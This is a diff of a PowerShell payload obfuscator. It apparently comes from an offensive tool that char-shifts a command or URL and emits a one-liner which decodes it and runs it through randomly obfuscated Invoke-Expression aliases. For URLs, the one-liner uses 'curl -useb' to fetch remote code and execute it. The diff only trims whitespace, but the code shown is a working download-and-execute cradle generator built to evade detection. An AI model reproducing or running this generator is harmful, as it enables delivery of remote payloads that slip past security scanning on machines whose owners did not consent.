@@ -43,11 +43,9 @@ Catch [System.Net.WebException],[System.IO.IOException] {
     break
 }
 
-
 $added = $space | ForEach-Object {($_+$shift)}
 $charShift = $added | ForEach-Object {"[char]$_"}
 $modChar = $added -join ","
-
 
 Write-Host "`nModified Char Values:"
 Write-Host $modChar -ForegroundColor Cyan
@@ -58,9 +56,9 @@ $invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal 
 function CalcPayload() {
     $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
     if($tochar -clike 'http*') {
-        Write-Host ('@(' + $modChar + ')| % {$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
+        Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
     } else {
-        Write-Host ('@(' + $modChar + ')| % {$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
+        Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
     }
 }
 CalcPayload
